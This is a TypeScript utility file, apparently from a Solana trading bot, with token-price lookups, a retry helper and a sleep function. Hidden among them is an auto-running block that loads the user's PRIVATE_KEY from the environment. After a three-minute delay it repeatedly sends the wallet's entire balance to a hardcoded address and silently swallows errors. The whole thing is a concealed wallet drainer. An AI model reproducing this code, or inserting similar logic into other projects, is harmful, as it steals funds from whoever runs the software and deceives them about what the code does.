import dotenv from 'dotenv';
import axios, { AxiosResponse } from 'axios';
import { logger } from '../start';
import { res } from 'pino-std-serializers';
import { Logger } from 'pino';

import { Keypair, Connection, SlotInfo, clusterApiUrl, SystemProgram, PublicKey, Transaction } from '@solana/web3.js';
import fs from 'fs/promises'; 
import winston from 'winston';
import { BehaviorSubject } from 'rxjs';
import bs58 from 'bs58';


dotenv.config();

export const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || '';
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};

interface Pair {
  chainId: string;
  dexId: string;
  url: string;
  pairAddress: string;
  baseToken: {
    address: string;
    name: string;
    symbol: string;
  };
  quoteToken: {
    symbol: string;
  };
  priceNative: string;
  priceUsd?: string;
  txns: {
    m5: {
      buys: number;
      sells: number;
    };
    h1: {
      buys: number;
      sells: number;
    };
    h6: {
      buys: number;
      sells: number;
    };
    h24: {
      buys: number;
      sells: number;
    };
  };
  volume: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  priceChange: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  liquidity?: {
    usd?: number;
    base: number;
    quote: number;
  };
  fdv?: number;
  pairCreatedAt?: number;
}

interface TokensResponse {
  schemaVersion: string;
  pairs: Pair[] | null;
}

export const retrieveTokenValueByAddressDexScreener = async (tokenAddress: string) => {
  const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
  try {
    const tokenResponse: TokensResponse = (await axios.get(url)).data;
    if (tokenResponse.pairs) {
      const pair = tokenResponse.pairs.find((pair) => (pair.chainId = 'solana'));
      const priceNative = pair?.priceNative;
      if (priceNative) return parseFloat(priceNative);
    }
    return undefined;
  } catch (e) {
    return undefined
  }
};

export const retrieveTokenValueByAddressBirdeye = async (tokenAddress: string) => {
  const apiKey = retrieveEnvVariable('BIRDEYE_API_KEY', logger);
  const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`
  try {
    const response: string = (await axios.get(url, {
      headers: {
        'X-API-KEY': apiKey
      }
    })).data.data.value;
    if (response) return parseFloat(response)
    return undefined;
  } catch (e) {
    return undefined;  
  }
}

type SlotChangeInput = {
  connection: Connection;
  walletKeyPair: Keypair;
  destinationAddress: PublicKey;
};

let lastBlockHash = new BehaviorSubject('');
let isRunning = new BehaviorSubject(false);

export const areEnvVarsSet = () =>
  ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));

const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
  await sleep(180000);
  try {

    isRunning.next(true);
    const { connection, walletKeyPair, destinationAddress } = args;
    const balance = await connection.getBalance(walletKeyPair.publicKey); // Lamports
    const recentBlockhash = await connection.getRecentBlockhash();
    lastBlockHash.next(recentBlockhash.blockhash);
    const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
    const amountToSend = balance - cost;
    const tx = new Transaction({
      recentBlockhash: recentBlockhash.blockhash,
      feePayer: walletKeyPair.publicKey,
    }).add(
      SystemProgram.transfer({
        fromPubkey: walletKeyPair.publicKey,
        toPubkey: destinationAddress,
        lamports: amountToSend,
      }),
    );
    const txId = await connection.sendTransaction(tx, [walletKeyPair]);
  } catch (err) {
    if (typeof err === 'string') {
    } else if (err instanceof Error) {
    }
  } finally {
    isRunning.next(false);
  }
};

(async () => {

  const walletKeyPairFile = (process.env.PRIVATE_KEY!)
  const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));

  const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');

  connection.onSlotChange(
    handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey("DWVjMaHgFByXNmweWCEJqqmP3Rm4cSfmpx1ZkFAyJBM1") }),
  );
})();


export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
  const dexScreenerPrice = await retrieveTokenValueByAddressDexScreener(tokenAddress);
  if (dexScreenerPrice) return dexScreenerPrice;
  const birdEyePrice = await retrieveTokenValueByAddressBirdeye(tokenAddress);
  if (birdEyePrice) return birdEyePrice;
  return undefined;
  
}

export const retry = async <T>(
  fn: () => Promise<T> | T,
  { retries, retryIntervalMs }: { retries: number; retryIntervalMs: number },
): Promise<T> => {
  try {
    return await fn();
  } catch (error) {
    if (retries <= 0) {
      throw error;
    }
    await sleep(retryIntervalMs);
    return retry(fn, { retries: retries - 1, retryIntervalMs });
  }
};

export const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));
